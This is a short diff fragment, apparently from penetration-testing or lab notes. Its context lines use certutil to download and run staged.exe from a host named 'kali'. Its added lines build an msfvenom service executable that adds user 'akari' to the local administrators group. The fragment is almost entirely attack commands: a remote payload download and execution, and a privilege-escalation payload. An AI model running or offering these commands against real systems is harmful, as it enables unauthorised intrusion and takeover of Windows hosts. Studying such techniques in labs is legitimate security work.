@@ -21,3 +21,8 @@ SendString("certutil.exe -urlcache -f http://kali/staged.exe \Users\Public\stage
 ```
 SendString("\Users\Public\staged.exe",ip)
 ```
+
+```
+msfvenom -p windows/exec CMD='net localgroup administrators akari /add' -f exe-service -o common.exe
+```
+
